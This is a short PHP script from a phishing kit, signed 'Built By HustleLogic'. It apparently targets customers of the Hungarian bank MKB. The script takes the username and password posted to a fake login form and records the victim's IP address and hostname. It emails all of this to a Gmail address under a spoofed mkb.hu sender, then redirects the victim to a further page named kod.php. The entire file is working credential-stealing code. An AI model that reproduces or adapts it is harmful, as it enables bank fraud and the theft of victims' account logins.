<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$msg .= "\n";
$msg .= "Username : ".$_POST['user']."\n";
$msg .= "Password : ".$_POST['pd']."\n";
$msg .= "\n";
$msg .= "IP: ".$ip."\n";
$msg .= "HostName : ".$hostname."\n";
$msg .= "\n";
$msg .= "------------Built By HustleLogic----------------\n";
$post = "@gmail.com";
$subj = "MKB Log - ".$_POST['user']."\n";
$from = "From: $ip<swipe@mkb.hu>";
mail("$post",$subj, $msg, $from); 
header("Location: kod.php");  	  

?>


